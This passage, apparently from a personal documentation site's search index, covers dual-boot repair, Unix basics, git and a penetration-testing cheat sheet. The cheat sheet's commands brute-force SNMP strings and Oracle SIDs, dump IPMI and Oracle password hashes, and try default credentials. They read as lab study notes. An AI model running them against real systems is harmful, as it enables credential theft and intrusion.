(2 physical disks), 16GiB RAM.</p> <ol> <li>Download an install Balena Etcher.</li> <li>Download ParrotOS ISO image.</li> <li>Flash ParrotOS to any flash drive using balenaEtcher.</li> <li>Once the USB is ready, restart the system.</li> <li>Before the system boots, press F12 to boot from the flash drive.</li> <li>Install ParrotOS.</li> </ol> <p>Manual Partitioning The ideal way to work with a dual boot system is to keep different OSs on different physical disks. </p> <p>As we can see, the <code>disk0</code> contains the host operating system. The host OS has 4 partitions. nvme1n1     259:0    0     931.5G      0   disk  \u251c\u2500nvme1n1p1 259:1    0    16M  0 part (System reserved) \u251c\u2500nvme1n1p2 259:2    0 429.2G  0 part (Host drive) \u251c\u2500nvme1n1p3 259:3    0   768M  0 part (System reserved and recovery) \u2514\u2500nvme1n1p4 259:4    0 501.5G  0 part (A normal partition)  </p> <p><code>disk1</code> contains the ParrotOS. nvme0n1     259:5    0     476.9G      0   disk \u251c\u2500nvme0n1p1 259:6    0    50G  0 part / \u251c\u2500nvme0n1p2 259:7    0    50G  0 part /home \u2514\u2500nvme0n1p3 259:8    0   500M  0 part /boot/efi  </p> <p>Problem statement Everything went smoothly but the boot option to log into windows was not available in the bios settings (F2). Also, the GRUB bootloader was not having any option to boot into the host operating system. The OS is present in the 1TB disk and is not corrupted or damaged, its just that somehow the boot partition got removed during the dual booting process. Also, you can't boot from the 1TB disk(<code>disk0</code>) that contains the host OS. You'll will not have this problem if you install both the operating systems in the same disk. (disk0 or disk1)</p> <p>Debugging strategy We are no more noobs, so we'll not even think about something like <code>\"Oh I can't boot into windows by any means, the windows boot manager is deleted, the disk0 is not present in the boot options as well, therefore I should format the entire disk0 and reinstall Windows11\".</code> </p> <p>First of all, let see if the boot manager is present in any of the 4 partitions of the disk0.</p> <p>Mount the system reserved/recovery partition of the host OS to the <code>/mnt</code> directory of parrot OS. <pre><code>sudo mount /dev/nvme1n1p3 /mnt\n</code></pre></p> <p>Check if the boot manager is present in this partition <pre><code>ls /mnt/EFI/Microsoft/Boot/\n</code></pre></p> <p>If the boot manager is not present here, then this issue can't be handled from parrot OS from now onwards. Let's create an installation media for windows 11 to perform advanced recovery. 1. Restart the system, press F12 to open the boot menu. 2. From here we should be able to boot from all the available disks. (<code>disk0, disk1 or USB Generic flash drive</code>) 3. Boot from USB Flash drive. 4. Click on <code>Repair your computer</code>. </p> <p></p> <ol> <li>Open Command Prompt in the Windows Recovery Environment.</li> <li>Rebuild the Boot Configuration Data (BCD):</li> </ol> <p></p> <p>Manually recreate the EFI boot entry:</p> <p></p> <p>Now we have something interesting - It is possible that you won't be able to type some characters or you'll press a <code>\\</code> but it will print a <code>#</code>. This may be due to a keyboard layout issue. You can still enter the required commands by using the alternative ASCII code for the backslash.</p> <p>Use ASCII Code for Backslash: Hold the Alt key and type 92 on the numeric keypad (make sure Num Lock is on), then release the Alt key. This should produce a backslash (<code>\\</code>).  </p> <p>After this, nvme1n1p3 will become a partition from which you'll be able to boot into windows 11 without a single issue. Now antoher problem is that, the GRUB bootloader (from which parrot OS is booted) doesn't contain the option to boot into windows 11. Therefore, we have to restart the system and press F12 to open the boot menu. From here we will select the <code>disk0</code> and it will take us directly inside Windows 11.</p> <p>Another problem that may arise here is that, if you try to shutdown the windows it will not shutdown the system and will just log you out from the windows. This issue could be related to the Fast Startup feature in Windows, which sometimes causes problems in dual-boot setups. Fast Startup is a hybrid shutdown feature that saves the state of the operating system to a hibernation file.  </p> <p></p> <p>Finally, let's fix the last step and that is to add a boot entry for windows 11 in the GRUB bootloader. 1. Boot into Parrot OS. 2. Mount nvme1n1p3 to the /mnt directory of ParrotOS. 3. Add a Custom GRUB Entry</p> <p></p> <p>For this case study, it should be:</p> <p></p> <p>That's it, execute sudo reboot to see the below holy screen.  </p>"},{"location":"school/tiers/os/#installing-amd-gpu-graphics-drivers","title":"Installing AMD GPU Graphics drivers","text":"<ol> <li>Install the drivers from <code>install-amdgpu</code> binary.</li> <li>Make sure the deb URL contains the <code>jammy</code> mirror.</li> </ol> <pre><code>cat /etc/apt/sources.list.d/amdgpu.list\ndeb https://repo.radeon.com/amdgpu/6.1.3/ubuntu jammy main\n#deb-src https://repo.radeon.com/amdgpu/6.1.3/ubuntu jammy main\n</code></pre> <ol> <li><code>sudo amdgpu-install --usecase=graphics,opencl --vulkan=amdvlk,pro</code></li> <li><code>sudo lshw -C display</code></li> </ol>"},{"location":"school/tiers/services/","title":"Services","text":""},{"location":"school/tiers/services/#principles","title":"Principles","text":"No. Principle <code>1</code> There is more than meets the eye. Consider all points of view. <code>2</code> Distinguish between what we see and what we do not see. <code>3</code> There are always ways to gain more information. Understand the target"},{"location":"school/tiers/services/#services_1","title":"Services","text":"<p>Default Passwords</p> <p>Try out known default passwords for ANY services that we discover, as these are often left unchanged and can lead to quick wins.</p>"},{"location":"school/tiers/services/#ssh","title":"SSH","text":"<p>Configuration file stored at - <code>/etc/ssh/sshd_config</code></p> <pre><code>ssh -v r3dp4rrot@&lt;server_ip&gt; -o PreferredAuthentications=password\n</code></pre>"},{"location":"school/tiers/services/#rdp","title":"RDP","text":"<p>Fingerprinting RDP via nmap <pre><code>nmap -sV -sC &lt;server_ip&gt; -p3389 --script rdp*\n</code></pre></p> <p>Initiate an RDP Session <pre><code>xfreerdp /u:&lt;user&gt; /p:\"&lt;pass&gt;\" /v:&lt;rdp_server_ip&gt;\n</code></pre></p>"},{"location":"school/tiers/services/#winrm","title":"WinRM","text":"<p>WinRM relies on TCP ports <code>5985</code> and <code>5986</code> for communication, with the last port <code>5986 using HTTPS</code>.</p> <pre><code>evil-winrm -i &lt;server_ip&gt; -u &lt;user&gt; -p &lt;password&gt;\n</code></pre>"},{"location":"school/tiers/services/#ftp","title":"FTP","text":"<p>Control channel on TCP port 21. Data transfer channel on TCP port 20. File Transfer Protocol (TFTP) uses TCP. Trivial File Transfer Protocol (TFTP) uses UDP.  </p> <p>Configuration file stored at - <code>/etc/vsftpd.conf</code> Connecting to an FTP server and getting the server settings. <pre><code>ftp &lt;server_ip&gt;\n&gt; status\n</code></pre></p> <p>Recursive directory listing <pre><code>&gt; ls -R\n</code></pre></p> <p>Download a file from the ftp server <pre><code>&gt; get Flags\\ flag.txt\nOR \n&gt; cd Flags\n&gt; mget flag.txt\n</code></pre></p> <p>Upload a file to the ftp server <pre><code>&gt; put some.exe\n</code></pre></p> <p>Connecting to the FTP server using netcat <pre><code>nc -nv &lt;server_ip&gt; 21\n</code></pre></p> <p>Connecting to the FTP server using telnet <pre><code>telnet &lt;server_ip&gt; 21\n</code></pre></p> <p>Connect to a TLS enabled FTP server <pre><code>openssl s_client -connect &lt;server_ip&gt;:21 -starttls ftp\n</code></pre></p> <p>Connect to an FTP server as a user <pre><code>ftp &lt;user&gt;@&lt;server_ip&gt;\n</code></pre></p>"},{"location":"school/tiers/services/#smb","title":"SMB","text":"<p>Samba server listens on TCP ports <code>137, 138, 139</code>, but CIFS uses TCP port <code>445</code> only. Configuration file stored at - <code>/etc/samba/smb.conf</code></p>"},{"location":"school/tiers/services/#nfc","title":"NFC","text":"<p>UDP or TCP port <code>2049</code> is used to run the service.</p>"},{"location":"school/tiers/services/#dns","title":"DNS","text":"<p><code>Learn how to configure a DNS server</code></p>"},{"location":"school/tiers/services/#smtp","title":"SMTP","text":""},{"location":"school/tiers/services/#impapop3","title":"IMPA/POP3","text":"<pre><code># List all the INBOXs\ncurl -k --url 'imaps://10.129.92.23' --user username:passwd -X 'LIST \"\" *'\n\n# Select the INBOX\ncurl -k --url 'imaps://10.129.92.23' --user username:passwd -X 'SELECT \"INBOX_NAME\"'\nOR\ncurl -k --url 'imaps://10.129.92.23/INBOX_NAME' --user username:passwd\n</code></pre> <pre><code>curl -v -k --url 'imaps://10.129.92.23/$MAILBOX' --user 'username:passwd' -X 'FETCH 1 BODY[]'\n</code></pre> <pre><code># connect to IMAP via SSL/TLS\nopenssl s_client -connect 10.129.14.128:imaps\n\n# connect to POP3 via SSL/TLS\nopenssl s_client -connect 10.129.14.128:pop3s\n</code></pre>"},{"location":"school/tiers/services/#snmp","title":"SNMP","text":"<p><code>Learn how to configure an SNMP daemon</code></p> <pre><code># bruteforcing community strings\nonesixtyone -c /opt/SecLists/Discovery/SNMP/snmp-onesixtyone.txt &lt;server_ip&gt;\n\n# Bruteforcing oids with braa\nbraa public@&lt;server_ip&gt;:.1.3.6.*\n\nsnmpwalk -v2c -c &lt;community_str&gt; &lt;server_ip&gt;\n</code></pre>"},{"location":"school/tiers/services/#mysql","title":"MySQL","text":"<p>The configuration files of MySQL server are loacted at - <code>/etc/mysql/mysql.conf.d/mysqld.cnf</code> <pre><code># connect to a MySQL server using creds\nmysql -u username -pPassword -h &lt;server_ip&gt;\n</code></pre></p>"},{"location":"school/tiers/services/#mssql","title":"MSSQL","text":"<p>Footprinting the MSSQL service using Nmap <pre><code>nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.3.154\n</code></pre></p> <p>Ping the MSSQL server using Metasploit <pre><code>msfconsole\n&gt; use use auxiliary/scanner/mssql/mssql_ping\n&gt; set rhosts &lt;mssql_server_ip&gt;\n</code></pre></p> <p>Connect to MSSQL Server using Impacket's mssqlclient.py script <pre><code>python3 examples/mssqlclient.py username@&lt;mssql_server_ip&gt; -windows-auth\n</code></pre></p>"},{"location":"school/tiers/services/#oracle-tns","title":"Oracle TNS","text":"<p>Bruteforcing SIDs using nmap <pre><code>nmap &lt;oracle_db_ip&gt; -p1521 -sCV --script oracle-sid-brute\n</code></pre></p> <p>Enumerating the oracle TNS using odat.py <pre><code>python3 ./odat.py all -s &lt;oracle_db_ip&gt;\n</code></pre></p> <p>Get auth credentials using the obtained SID <pre><code>python3 ./odat.py all -s &lt;oracle_db_ip&gt; -d &lt;SID&gt;\n</code></pre></p> <p>Attempting to login as sysdba via obtained credentials <pre><code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;oracle_db_ip&gt;/XE as sysdba\n</code></pre></p> <p>Getting password hashes from the connected DB <pre><code>SQL&gt; select name, password from sys.user$;\n</code></pre></p>"},{"location":"school/tiers/services/#ipmi","title":"IPMI","text":"<p>IPMI communicates over port <code>623 UDP</code>. Systems that use the IPMI protocol are called <code>Baseboard Management Controllers (BMCs)</code>. BMCs are typically implemented as embedded ARM systems running Linux, and connected directly to the host's motherboard. BMCs are built into many motherboards but can also be added to a system as a PCI card.  </p> <p>If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system. <code>Gaining access to a BMC is nearly equivalent to physical access to a system</code>. Many BMCs (including HP iLO, Dell DRAC, and Supermicro IPMI) expose a web-based management console, some sort of command-line remote access protocol such as Telnet or SSH, and the port 623 UDP, which, again, is for the IPMI network protocol. </p> <p>Fingerprinting the service running on UDP port 623. <pre><code>sudo nmap -sU --script ipmi-version -p 623 &lt;subdomain&gt;\n</code></pre></p> <p>Metasploit version scan <pre><code>msfconsole\nmsf6 &gt; use auxiliary/scanner/ipmi/ipmi_version \nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; set rhosts &lt;server_ip&gt;\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; show options\nmsf6 auxiliary(scanner/ipmi/ipmi_version) &gt; run\n</code></pre></p> <p>Obtain the password hash for ANY valid user account on the BMC via <code>Metasploit</code>. <pre><code>msf6 &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set rhosts 10.129.42.195\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; show options \nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt;&gt; set PASS_FILE /opt/SecLists/Passwords/bt4-password.txt\nmsf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run\n</code></pre></p>"},{"location":"school/tiers/unixbasics/","title":"Fundamentals","text":""},{"location":"school/tiers/unixbasics/#control-the-os","title":"Control the OS","text":"<p>Own it</p> <p>With control, comes power</p> <p>The most crucial power that is needed to become a system administrator is having the ability to control it as if you really own everything. </p>"},{"location":"school/tiers/unixbasics/#prompt-description","title":"Prompt description","text":"<p>The prompt can be customized using special characters and variables in the shell\u2019s configuration file (.bashrc for the Bash shell). You can use tools such as powerline, bash prompt generator etc. to customize the prompt.</p>"},{"location":"school/tiers/unixbasics/#getting-started","title":"Getting started","text":""},{"location":"school/tiers/unixbasics/#general","title":"General","text":"<ol> <li> <p>The shell command is too complex!</p> <p>Even after learning the basics, if a command appears quite complex, we can break it down into understandable peices using - explainshell</p> </li> <li> <p><code>~</code> is the home directory of the currently logged in user.</p> </li> </ol>"},{"location":"school/tiers/unixbasics/#system-information","title":"System Information","text":"<p>Each manual page has a short description available within it. This tool searches the descriptions for instances of a given tool.</p> <pre><code>apropos &lt;keyword&gt;\n</code></pre> <p><code>uname</code></p> <pre><code>winusr@RYZEN7-4800H:/var/www/quadocs$ uname -a\nLinux RYZEN7-4800H 5.15.146.1-microsoft-standard-WSL2 #1 SMP Thu Jan 11 04:09:03 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux\n</code></pre> <p>Kernel name - Linux Host name - RYZEN7-4800H kernel release - 5.15.146.1-microsoft-standard-WSL2 kernel version - #1 SMP Thu Jan 11 04:09:03 UTC 2024</p>"},{"location":"school/tiers/unixbasics/#navigation","title":"Navigation","text":"Command Description <code>ls</code> List directory contents <code>ls -l</code> Add the -l option to display more information on those directories and files <code>ls -la</code> List all files of a directory <code>cd</code> Navigate to the home directory of the current user <code>ls -la /var/</code> List all files present in the <code>/var</code> directory <code>cd -</code> We can quickly jump back to the directory we were last in <p>What the heck is drwxr-xr-x ? <pre><code>username@hostname:~$ ls -l /etc/passwd\n\n- rwx rw- r--   1 root root 1641 May  4 23:42 /etc/passwd\n- --- --- ---   |  |    |    |   |__________|\n|  |   |   |    |  |    |    |        |_ Date\n|  |   |   |    |  |    |    |__________ File Size\n|  |   |   |    |  |    |_______________ Group\n|  |   |   |    |  |____________________ User\n|  |   |   |    |_______________________ Number of hard links\n|  |   |   |_ Permission of others (read)\n|  |   |_____ Permissions of the group (read, write)\n|  |_________ Permissions of the owner (read, write, execute)\n|____________ File type (- = File, d = Directory, l = Link, ... )\n</code></pre></p>"},{"location":"school/tiers/unixbasics/#terminal-shortcuts","title":"Terminal Shortcuts","text":"Keys Description CTRL + R  Search through the command history using the shortcut [Ctrl] + [R] and type some of the text that we are looking for CTRL + L  Clear the terminal"},{"location":"school/tiers/unixbasics/#file-and-directories","title":"File and directories <p>touch (create a file) <pre><code>$ touch hello.txt\n</code></pre></p> <p>mkdir (create directories in the filesystem)</p> <pre><code>$ mkdir -p Storage/local/user/documents\n</code></pre> <p>tree (visualize the files in a tree) <pre><code>$ tree .\n</code></pre></p> <p>mv (move + rename)</p> <p>This will move <code>code.py</code> from the current working directory to /var/www/html and rename it to <code>new_code.py</code> <pre><code>$ mv code.py /var/www/html/new_code.py\n</code></pre></p> <p>cp (file copying)</p> <p>This will copy all the files having an extension of <code>py</code> from the current working directory to /var/www/html <pre><code>$ cp *.py /var/www/html\n</code></pre></p> <p>Let's copy a file from Windows 11 to WSL. File name is <code>red (2).ovpn</code> and location is <code>/mnt/c/Users/jayan/Downloads/red (2).ovpn</code>. <pre><code>sudo cp /mnt/c/Users/jayan/Downloads/red (2).ovpn /opt\n</code></pre></p>  <p>Command interfering with bash</p> <p>-bash: syntax error near unexpected token `('</p>  <p>We need to escape the space and parentheses with \\ <pre><code>sudo cp /mnt/c/Users/jayan/Downloads/red\\ \\(2\\).ovpn /opt\n</code></pre></p>","text":""},{"location":"school/tiers/unixbasics/#text-editors","title":"Text editors <p>vim</p> <p>nano</p>","text":""},{"location":"school/tiers/unixbasics/#locating-files-and-directories","title":"Locating Files and directories <p>which</p> <pre><code>r3d@parrot$ which curl\n/usr/bin/curl\n</code></pre> <p>locate <pre><code>locate mssqlclient.py\n</code></pre></p> <p>find <pre><code>find / -type f -name mssqlclient.py 2&gt;/dev/null\n</code></pre></p>","text":""},{"location":"school/tiers/unixbasics/#file-descriptors-redirections","title":"File descriptors &amp; Redirections <p>What is /dev/null? Since everything in the OS is a file. Therefore /dev/null is also a file but with some powers vested in it. <code>/dev/null</code> is a special device file on Unix-like operating systems that serves as a virtual black hole for data. Any data written to <code>/dev/null</code> is discarded, and any read from it returns an end-of-file (EOF) immediately.</p> <p>What are file descriptors (FD)? File descriptors are integer values that the operating system assigns to open files or I/O resources.  </p>    FD Meaning     0 STDIN   1 STDOUT   2 STDERR    <p>  <pre><code>touch /tmp/err\n cd ~/../../root\n-bash: cd: /home/winusr/../../root: Permission denied\n</code></pre> <p>If the user is not able to navigate to the root directory, then the output is an <code>STDERR</code>. Redirection means storing this error somewhere but in real life we don't want to store the error. (Error is different from log) Therefore, we want to send this <code>STDERR</code> to the linux trash can - <code>/dev/null</code></p> <p>The below command won't output any error as we're redirecting the error to a file - <code>/tmp/err</code> <pre><code>cd ~/../../root 2&gt;/tmp/err\n</code></pre></p> <pre><code>cat /tmp/err\n-bash: cd: /home/winusr/../../root: Permission denied\n</code></pre> <p>Redirecting the error to the trash can(/dev/null) <pre><code>cd ~/../../root 2&gt;/dev/null\n</code></pre></p>","text":""},{"location":"school/tiers/unixbasics/#setup-python-virtual-environment","title":"Setup python virtual environment <p>A simple demonstration for creating and activating a python virtual environment. <pre><code>python3 -m venv virtualenv\nsource virtualenv/bin/activate\n</code></pre></p> <p>Once the virtual environment is activated, we can install all the dependencies within that environment using: <pre><code>pip install -r requirements.txt\n</code></pre></p> <p>List all the packages installed in the virtual environment <pre><code>pip freeze\n</code></pre></p> <p>If there is a <code>setup.py</code> file in the repository (for eg. <code>Impacket</code>), then we have to make the modules accessible within the virtual environment. Use setup.py to install the module into your Python environment. This will ensure that all dependencies and the package itself are correctly set up.</p> <pre><code>python setup.py install\n</code></pre>","text":""},{"location":"school/tiers/unixbasics/#bread-and-butter","title":"Bread and butter","text":""},{"location":"school/tiers/unixbasics/#grep","title":"grep","text":"<p>grep - Global regular expression print. -v -  The grep -v flag is used to invert the match in grep. This means that grep -v will output all lines that do not match the specified pattern.</p> <p><code>curl -s https://crt.sh/\\?q\\=inlanefreight.com\\&amp;output\\=json | jq . | grep name | cut -d\":\" -f2 | grep -v \"CN=\" | awk '{gsub(/\\\\n/, \"\\n\"); print $0;}' | sort -u</code></p>"},{"location":"school/tiers/unixbasics/#sed","title":"sed","text":"<pre><code>cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v '#' | sed -r '/^\\s*$/d'\n</code></pre>"},{"location":"school/tiers/unixbasics/#awk","title":"awk","text":"<p>gsub - Global substitute function.</p> <p>This part of the awk script uses the <code>gsub</code> function to globally substitute <code>\\\\n</code> with a real newline character (<code>\\n</code>). The double backslash is used to escape the <code>\\n</code> so that awk interprets it as a literal <code>\\n</code> rather than a newline character. <pre><code>awk '{gsub(/\\\\n/, \"\\n\"); print $0};' | input.txt\n</code></pre></p>"},{"location":"school/tiers/unixbasics/#cut","title":"cut","text":""},{"location":"school/tiers/unixbasics/#sort","title":"sort","text":"<p>-u - This flag stands for \"unique\" and tells sort to remove duplicate lines from the output.</p>"},{"location":"school/tiers/unixbasics/#curl","title":"curl","text":"<p>-I - Only get the HTTP Response headers.  </p>"},{"location":"webdev/","title":"Fundamentals","text":""},{"location":"webdev/#coding-style-guide","title":"Coding style guide","text":"<p>What if github never existed?  In that case, maintaining a codebase becomes even more challenging as compared to writing code. The style in which linux kernel was written, followed some of its own principles to write good code.  Linux kernel coding style is a short document describing the preferred coding style for the linux kernel.</p> <ol> <li>Verbosity in variable name - Less is the scope of variable, less verbose it must be. Meaning, keeping variable names short is a good practice if that variable is defined within a fucntion whose scope is less.</li> <li>Any code block should\u2019nt have more than 4 indents.</li> <li>An empty line depicts the starting of a logic block.</li> <li>Never copy code, even if it is guaranteed to work.</li> <li>Never use terminal as sudo unless required.</li> <li>If you have multiple conditions in a if or a for loop, then specify each condition in new line. (Increases readability)</li> <li>Private functions inside classes should start with an underscore _</li> <li>Always leave a space after a , (Just a programming principle)</li> <li>If a function is doing something, its name must be a verb. For example, if a function is creating a 3D geometry in space then its name should be something like createGeometry().</li> <li>Variable names must be easy to pronounce.</li> <li>Any functions that are private but visible outside should start with _ so that anyone trying to call it will know it is a private method and cannot be used from outside. </li> <li>If the function is not visible outside and is only defined in the local scope then it need not have _.</li> <li>Logical operations should be in one block, means, Always leave a space after a logical block.</li> <li>Don\u2019t use a variable that is not passed to a function. For example, using global variables within a function without passing them to the function.</li> <li>Each function should not be more than 30 lines, thereby decreasing the Bug Exposure.</li> <li>No trailing whitespaces should be present.</li> <li>Array variable names should end with an s to indicate that the variable is a collection.</li> <li>Transient variables should have a block scope. Therefore, declare the transient variables using let because let has a block scope.</li> <li>var has a stronger scope as compared to let.</li> </ol>"},{"location":"webdev/#python-zen","title":"Python Zen","text":"<pre><code>import this\n</code></pre> The Zen of Python, by Tim Peters <p>Beautiful is better than ugly. Simple is better than complex. Complex is better than complicated. Flat is better than nested. Sparse is better than dense. Readability counts. Special cases aren't special enough to break the rules. Although practicality beats purity. Errors should never pass silently. Unless explicitly silenced. In the face of ambiguity, refuse the temptation to guess. There should be one-- and preferably only one --obvious way to do it. Although that way may not be obvious at first unless you're Dutch. Now is better than never. Although never is often better than right now. If the implementation is hard to explain, it's a bad idea. If the implementation is easy to explain, it may be a good idea. Namespaces are one honking great idea -- let's do more of those!</p>"},{"location":"webdev/#vscode-keyboard-shortcuts","title":"VSCode keyboard shortcuts","text":"Keys Description Fn + F2 Click on any word and press fn + F2 to rename that word in all instances of it. Hold ALT Hold the Alt key and now if you click on different words (one by one), then you will be able to edit multiple words using a single  cursor. SHIFT + TAB move the selected code block by one indent back. Fn + F12 Click on a function once and press fn + F12 to see the function definition. CTRL + Y Redo <p>Descriptive but handy tricks Move the line downwards: 1. Place the cursor anywhere in the desired line. 2. Press and hold the ALT key. 3. Press the down key if you want to move the line below, for example moving line number 12 to line number 13.</p>"},{"location":"webdev/#git-and-version-control","title":"Git and version control","text":"<p>Your Github username - <code>Parrot</code>  Role - Software developer intern at RedParrotHQ  Task - Set up SSH access to your dev machine, fork the <code>redparrot</code> repository (this is a private repository) and submit a PR. The RedParrot's project repository URL is <code>https://github.com/RedParrotHQ/redparrot.git</code>. Since you're a software developer and you are requested to submit a PR but you don't have write access to this repository because you're just an intern, assuming you don't know about fundamental software development principles.</p>"},{"location":"webdev/#clone-the-repository","title":"Clone the repository","text":"<p>First things first, you have to clone the repository to your local machine and for that you need <code>Read</code> permissions on the remote repository - <code>https://github.com/RedParrotHQ/redparrot.git</code>. Therefore, an admin of RedParrotHQ has invited you to join the organization. <pre><code>git clone git@github.com:RedParrotHQ/redparrot.git .\n</code></pre> This should download the repository to your current working directory through SSH (since we've used the SSH url)</p>"},{"location":"webdev/#fork-the-repository","title":"Fork the repository","text":"<p>The <code>redparrot</code> repository is not forked yet. Once you fork the repository, you'll be able to see the repository at: <code>https://github.com/Parrot/redparrot.git</code></p>"},{"location":"webdev/#setup-ssh-access","title":"Setup SSH access","text":"<p>In order to setup tracking between your cloned repository with your forked repository. You need write access to your fork using github CLI. For that, setup SSH access to your github account using ssh keys.</p> <p>Generate SSH keys if you're booting in your system for the first time. <pre><code>ssh-keygen -t rsa -b 4096 -C \"Parrot@redparrot.in\"\n</code></pre> By default ssh keys are located at ~/.ssh/. Let's say your public key is located at ~/.ssh/id_rsa.pub and the private key at ~/.ssh/id_rsa. Once the keys are generated, the public key needs to be added to your github account under- Settings &gt; SSH and GPG keys &gt; New SSH key</p> <p>Test if you can access your github account through the CLI. <pre><code>$ ssh -T git@github.com\nHi Parrot! You've successfully authenticated, but GitHub does not provide shell access.\n</code></pre></p>"},{"location":"webdev/#set-the-remote","title":"Set the remote","text":"<p>Now you can control and update your fork through CLI. First, try to check the existing remotes. A remote is a unique name which represents a repository through a URL. For instance, origin refers to your own fork. You can push any peice of code to your fork.</p> <pre><code>$ git remote -v\norigin  git@github.com:Parrot/redparrot.git (fetch)\norigin  git@github.com:Parrot/redparrot.git (push)\n</code></pre> <p>Let's say you own a second github account (username: Parrot2) and you want your <code>origin</code> to point to Parrot2's fork. Here's how to do it.  <pre><code>git remote set-url origin https://github.com/Parrot2/redparrot.git\n</code></pre></p>"},{"location":"webdev/#add-a-new-remote","title":"Add a new remote","text":"<p>What if you want to fetch a branch called <code>beta</code> from the <code>RedParrotHQ/redparrot</code> repo and push changes on top of it? To accomplish this, we've to set RedParrotHQ as a remote that will point to the organisation's private repository. <pre><code>git remote add RedParrotHQ git@github.com:RedParrotHQ/redparrot.git\n</code></pre></p>"},{"location":"webdev/#fetch-branches-from-a-remote","title":"Fetch branches from a remote","text":"<p>Fetching branch <code>beta</code> from RedParrotHQ <pre><code>git fetch RedParrotHQ beta\ngit checkout beta\n</code></pre></p>"},{"location":"webdev/#push-local-branches-to-remote","title":"Push local branches to remote","text":"<p>Now that you have the <code>beta</code> branch on your local machine, the next step is to push this branch to your fork.(origin) Next, set the upstream branch as <code>origin/beta</code> for tracking any changes that will be made to <code>beta</code> branch in future. <pre><code>git push origin beta\ngit push --set-upstream origin beta\n</code></pre></p>"},{"location":"webdev/#commiting-and-pushing-changes","title":"Commiting and pushing changes","text":"<p>This is where everything clicks together. Submitting a PR.</p> <pre><code>git checkout master\ngit checkout -b task\ngit push origin task\ngit push --set-upstream origin task\ngit add .\ngit commit -m 'Task completed'\ngit push\n</code></pre>"},{"location":"webdev/#opening-a-pull-request-pr","title":"Opening a Pull Request (PR)","text":"<p>This is the only thing that you are supposed to do using the GitHub GUI.</p>"},{"location":"webdev/#advanced-version-control-rebase","title":"Advanced version control: Rebase","text":"<p>Role - Software developer intern at RedParrotHQ  Task - The master branch went 7 commits ahead when you were learning how to submit your first PR. You are requested to push your commit on top of the latest master branch and update the PR.</p> <p>What is rebase? Referring to the current context, when you are making commits to your fork, the master branch was updated(means it had some merges). This would result in something like:  </p> <p>Sync Fork</p> <p>This branch is 7 commits behind RedParrotHQ/redparrot:master.</p> <p>To update the master branch at your fork(<code>https://github.com/Parrot/redparrot.git</code>), simply <code>Sync Fork</code> to sync the fork with RedParrotHQ's master. Next, you've to update the local branch: <pre><code>git checkout master\ngit pull\n</code></pre></p> <p>Now checkout the <code>task</code> branch, which needs to be rebased. <pre><code>git checkout task\n</code></pre></p> <p>Performing rebase on branch <code>task</code> <pre><code>git rebase -i master\n</code></pre> -i refers to the interactive rebase.</p> <p>You'll see something like this: <pre><code>pick 156adcb Task completed\n\n# Rebase abc5d8..156adcb onto afbd5d9 (1 command)\n#\n# Commands:\n# p, pick &lt;commit&gt; = use commit\n# r, reword &lt;commit&gt; = use commit, but edit the commit message\n# e, edit &lt;commit&gt; = use commit, but stop for amending\n# s, squash &lt;commit&gt; = use commit, but meld into previous commit\n# f, fixup [-C | -c] &lt;commit&gt; = like \"squash\" but keep only the previous\n#                    commit's log message, unless -C is used, in which case\n#                    keep only this commit's message; -c is same as -C but\n#                    opens the editor\n# x, exec &lt;command&gt; = run command (the rest of the line) using shell\n# b, break = stop here (continue rebase later with 'git rebase --continue')\n# d, drop &lt;commit&gt; = remove commit\n# l, label &lt;label&gt; = label current HEAD with a name\n# t, reset &lt;label&gt; = reset HEAD to a label\n# m, merge [-C &lt;commit&gt; | -c &lt;commit&gt;] &lt;label&gt; [# &lt;oneline&gt;]\n# .       create a merge commit using the original merge commit's\n# .       message (or the oneline, if no original merge commit was\n# .       specified); use -c &lt;commit&gt; to reword the commit message\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n</code></pre></p> <p>VSCode plugins</p> <p>VSCode Extension - Git graph View a Git Graph of your repository, and perform Git actions from the graph.</p> <p>This is opened in the <code>nano</code> editor by default. Simply exit and save changes. This completes the rebase assuming there were no merge conflicts. We will dive deeper as the practicality of this module increases.</p>"},{"location":"webdev/#using-the-browser-dev-tools","title":"Using the browser dev tools","text":"<p>Even if you know how to develop a software but if you're not a good debugger, then you'll really struggle a lot to find bugs. Usually, in a corporate enterprise codebase, there are thousands of lines of code in one single file. And there are multiple files with the exact same name located in different folders. It won't be anyone's cup of tea to keep more than 8 stacks/threads in their head to find that one bug. A bug has some parameters like - severity, impact, exposure, type etc. The basic steps for debugging anything are:</p> <ol> <li>Ask questions from yourself, like - <code>The request is sent by the APIClient. How the controller is handling this API endpoint? Okay, this endpoint is taking the request body to create an object and then this object is posted to some other handler. Maybe that handler failed processing this object the way its supposed to?</code></li> <li>Reduce the bug exposure instead of finding an alternative way to bypass the bug which is called as a <code>PATCH</code>. The patch may fix the bug in some cases but it will really help the bug to hide more deeper in the system, thereby increasing bug exposure.</li> <li>To debug something, it depends on the type of bug i.e frontend, backend, devops etc. Let's say the bug is in front end feature.</li> <li>You can simply add a breakpoint in the browser dev tools and then trigger the execution flow. When the control hits the line at which breakpoint is marked, you can simply hover on the variables, functions or anything to see what's really going on. At this point, unless you're high on drugs, it is close to impossible for the bug to still hide. </li> </ol>"},{"location":"webdev/#setting-up-aliases","title":"Setting up Aliases","text":"<p>It makes no sense to write a same long command 100 times to do the exact same thing everytime. This is where aliases come into picture. 